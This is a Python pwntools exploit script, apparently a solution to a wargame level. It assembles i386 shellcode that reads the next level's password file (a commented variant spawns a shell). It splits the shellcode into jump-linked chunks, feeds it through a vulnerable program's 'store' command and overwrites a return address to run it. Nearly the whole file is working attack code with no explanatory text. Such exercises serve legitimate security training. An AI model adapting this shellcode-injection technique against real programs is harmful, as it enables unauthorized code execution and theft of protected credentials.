import pwn
import re
import struct

def store(asm):
	global index
	asm += b'\x90' * (8 - len(asm))
	# tt += add + b'\x90' * (4 + (6 - size))
	hexasm = re.findall('(.{8})', asm.hex())
	for hexa in hexasm:
		hexa = re.findall('(.{2})', hexa)
		hexa.reverse()
		hexa = ''.join(hexa)
		print('store')
		print(int(hexa, 16))
		print(index)
		index += 1
		if index % 3 == 0:
			index += 1

shell = pwn.shellcraft.i386.linux.cat('/home/users/level08/.pass')
# shell = pwn.shellcraft.i386.linux.sh()
shell += pwn.shellcraft.i386.linux.exit(13)
shell = shell.split('\n')

add = b''
index = 1
size = 0
tt = b''
for line in shell:
	asm = pwn.asm(line)
	if (size + len(asm) > 6):
		add += pwn.asm('jmp $+' + hex(4 + (8 - size)))
		store(add)
		add = b''
		size = 0
	add += asm
	size += len(asm)
if size != 0:
	# tt += add 
	store(add)

if (True):
	# raw
	print('store')
	print(0xffffd478)
	print(-1040108826)
	print('quit')
else:
	# gdb
	print('store')
	print('4294956120')
	print('-1040108819')

# print(pwn.disasm(tt))
# p = pwn.run_shellcode(tt)
# p.wait_for_close()
# p.poll()
